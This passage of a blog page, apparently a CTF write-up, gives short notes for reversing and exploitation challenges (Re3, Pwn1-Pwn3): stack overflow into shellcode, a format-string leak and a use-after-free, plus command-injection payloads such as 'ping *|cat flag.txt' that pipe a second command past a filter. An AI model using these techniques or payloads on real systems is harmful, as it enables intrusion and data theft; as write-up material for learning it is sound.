+<span class="line"><span style="color:#61afef">00409056</span><span style="color:#abb2bf">  </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf">   </span><span style="color:#e5c07b">**</span><span style="color:#abb2bf"> </span><span style="color:#e5c07b">****</span><span style="color:#abb2bf"> </span><span style="color:#e5c07b">**</span><span style="color:#abb2bf">  </span><span style="color:#e5c07b">**</span></span>
+<span class="line"><span style="color:#61afef">00409066</span><span style="color:#abb2bf">  </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf">                     </span><span style="color:#e5c07b">***</span><span style="color:#abb2bf">    </span><span style="color:#e5c07b">**</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">everytime I can +8,-8,+1,-1</span></span>
+<span class="line"><span style="color:#abb2bf">from 0x00409046 to 0x00409053</span></span>
+<span class="line"><span style="color:#abb2bf">cannot on 0x2A,length 25.</span></span></code></pre>
+<h3 id="re3">Re3:</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">use a table to control execution.</span></span>
+<span class="line"><span style="color:#abb2bf">breakpoint on every case to switch.</span></span>
+<span class="line"><span style="color:#abb2bf">look at the parameter of every crucial function(strcmp, strlen and so on)</span></span>
+<span class="line"><span style="color:#abb2bf">input len : 13, every -0x80, compare with a string.</span></span></code></pre>
+<h3 id="pwn1">Pwn1:</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">no NX, a global buffer we can enter into.</span></span>
+<span class="line"><span style="color:#abb2bf">a stack overflow, no cookie.</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">arrange shellcode in global buffer, use stack overflow to return to buffer,getshell.</span></span></code></pre>
+<h3 id="pwn2">Pwn2:</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">no NX, a global buffer we can enter into.</span></span>
+<span class="line"><span style="color:#abb2bf">a fsb, we can leak address.</span></span>
+<span class="line"><span style="color:#abb2bf">a uaf, we can jmp to anywhere.</span></span>
+<span class="line"><span style="color:#abb2bf">but we cannot write shellcode in global buffer,beacuse we use uaf, the buffer will be corrupted.</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">so, leak stack address, and then use uaf return to stack buffer.</span></span></code></pre>
+<h3 id="pwn3">Pwn3:</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">NX, cannot execute shellcode in stack and heap.</span></span>
+<span class="line"><span style="color:#abb2bf">safe stack, cannot overflow the stack</span></span>
+<span class="line"><span style="color:#abb2bf">but,there is a fsb and a command injection.</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">bypass '&gt;', ';', '&lt;'</span></span>
+<span class="line"><span style="color:#abb2bf">use pipe.</span></span>
+<span class="line"><span style="color:#abb2bf">but cannot getshell.</span></span>
+<span class="line"><span style="color:#abb2bf">payload "ping *|ls"</span></span>
+<span class="line"><span style="color:#abb2bf">look at the file of flag's name,flag.txt</span></span>
+<span class="line"><span style="color:#abb2bf">use payload again "ping *|cat flag.txt"</span></span></code></pre>
+<p>&lt;/conn_back_ip&gt;</p>
+    </article>
+
+    <ul class="astro-VJ4TPSPI tags-container">
+      <li class="astro-BLWJYJPT inline-block my-1 underline-offset-4">
+  <a class="astro-BLWJYJPT group pr-2 text-sm" href="/tags/ctf">
+    <svg class="astro-BLWJYJPT scale-75" xmlns="http://www.w3.org/2000/svg"><path d="M16.018 3.815 15.232 8h-4.966l.716-3.815-1.964-.37L8.232 8H4v2h3.857l-.751 4H3v2h3.731l-.714 3.805 1.965.369L8.766 16h4.966l-.714 3.805 1.965.369.783-4.174H20v-2h-3.859l.751-4H21V8h-3.733l.716-3.815-1.965-.37zM14.106 14H9.141l.751-4h4.966l-.752 4z" class="astro-BLWJYJPT"></path>
+    </svg>
+    &nbsp;<span class="astro-BLWJYJPT">ctf</span>
+  </a>
+</li>
+    </ul>
+  </main>
+  <footer class="astro-SZ7XMLTE mt-auto">
+  <div class="max-w-3xl mx-auto px-0">
+  <hr aria-hidden="true" class="border-skin-line">
+</div>
+  <div class="astro-SZ7XMLTE footer-wrapper">
+    <div class="flex astro-UPU6FZXR social-icons">
+  <a class="inline-block astro-5EUNQZKT group astro-UPU6FZXR link-button" href="https://github.com/lc4t" tabindex="0" title=" 鱼の on Github">
+  
+        <svg class="icon-tabler" xmlns="http://www.w3.org/2000/svg" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M0 0h24v24H0z" fill="none" stroke="none"></path>
+    <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
+  </svg>
+      
+</a>
+</div>
+    <div class="astro-SZ7XMLTE copyright-wrapper">
+      <span class="astro-SZ7XMLTE">lc4t © 2023</span>
+      <span class="astro-SZ7XMLTE separator">&nbsp;|&nbsp;</span>
+      <span class="astro-SZ7XMLTE">The Things Less Created.</span>
+    </div>
+    <a class="inline-block astro-5EUNQZKT group undefined" href="https://icp.gov.moe/?keyword=20237773" tabindex="0">
+  
+      萌ICP备20237773号
+    
+</a>
+  </div>
+</footer>
+
+  </body></html>
